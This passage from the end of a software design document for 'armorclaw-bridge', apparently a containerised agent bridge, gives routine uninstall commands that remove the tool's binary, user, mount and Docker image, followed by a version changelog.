- Runs entirely inside container
- Models pulled automatically by OpenClaw

---

## Appendix B: Uninstall Instructions

```bash
# Using the built-in uninstall command
sudo armorclaw-bridge uninstall

# Manual uninstall
sudo rm /usr/local/bin/armorclaw-bridge
sudo userdel -r armorclaw
sudo groupdel armorclaw 2>/dev/null || true
sudo umount /run/armorclaw 2>/dev/null || true
sudo rmdir /run/armorclaw 2>/dev/null || true
docker rmi armorclaw/agent:v1 2>/dev/null || true
```

---

## Document Changelog

| Date | Version | Changes |
|------|---------|---------|
| 2026-02-05 | 1.0.0 | Initial v1 design document |
| 2026-02-05 | 1.1.0 | Added Testing Strategy with 48hr milestones |

---

**This document is locked for v1 implementation. All changes require explicit approval and version bump.**
